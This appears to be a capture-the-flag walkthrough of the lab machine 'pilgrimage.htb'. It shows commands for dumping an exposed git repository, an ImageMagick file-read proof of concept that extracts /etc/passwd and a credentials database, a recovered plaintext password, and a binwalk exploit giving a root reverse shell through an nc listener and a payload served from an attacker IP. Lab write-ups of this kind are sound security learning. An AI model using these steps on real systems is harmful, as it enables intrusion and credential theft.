Recon shows ports 22, 80
80 redirects to pilgrimage.htb, add that to /etc/hosts
The webpage looks like a page where we ccan upload a php rev shell as an image, and run the reverse shell
But it doesnt. the output of the file is renamed to jpg, and we cant really find the uploads directory. so we move on.

now, when we rerun nmap, it shows a IP/.git So does autorecon
so, we run git-dumper
`mkdir src`
`/opt/venv1/bin/git-dumper http://pilgrimage.htb/.git src` 

We see a magick binary, which when we run `./magick --version` shows ImageMagick 7.1.0-49. Quick search shows an exploit, and we clone
`https://github.com/Sybil-Scan/imagemagick-lfi-poc/blob/main/generate.py`

`python generate.py -f "/etc/passwd" -o expl.png`
Once generated, we can do `exiftool expl.png` and it should show /etc/passwd as a value for profile
Send it to the webpage, download the compressed image `wget link`
Now, we do `exiftool` on the downloaded image, and we see, under Raw Profile Tpe, a bunch of data. to format it properly, 
`identify -verbose result.png`
copy the hex, paste it to a file res.hex and use the command
`cat res.hex | xxd -r -p`
OR
`python3 -c 'print(bytes.fromhex("726f6f743a783a726f6f743---REDACTED--").decode("utf-8"))`

Nohing much we can do with this file, and we cant drop a fileintothe server, so not that useul either. However, when we looked into the code for login.php, it was looking into a database file, `/var/db/pilgrimage`. This is the file used to loginto the db to authenticate

---
`python generate.py -f "/var/db/pilgrimage" -o db.png`
upload, download wget
`identify -verbose shurnk_db.png`
paste hex to db.hex
`cat db.hex | xxf -r -p > pilgrim.db`

`sqlite3 pilgrim.db`
`.dump`
we see an entry with emily and password abigconkyboi123
ssh works, user.txt

---
We do a lot of looking around, but when we do ps -ef, we find this `cat /usr/sbin/malwarescan.sh` file running, and it is coded very securely
all the variables are being expanded inside double quotes (like "$FILE")
and all the binaries are used by full path.

So now, there are 2 binaries which are sus. `/usr/bin/inotifywait` and `/usr/local/bin/binwalk`
`binwalk -h` shows the version 2.3.2, and has an exploit.
Download the exploit
```zsh
touch binw.png
python binwalk_exploit.py binw.png 10.10.14.31 1234
	nc -lvnp 1234
python -m http.server 8990
```
`cd /var/www/privilege.htb/shrunk` (cuz thats where the binwalk is running on)
`wget http://10.10.14.31:8990/binwalk_exploit.png`
root shell!!
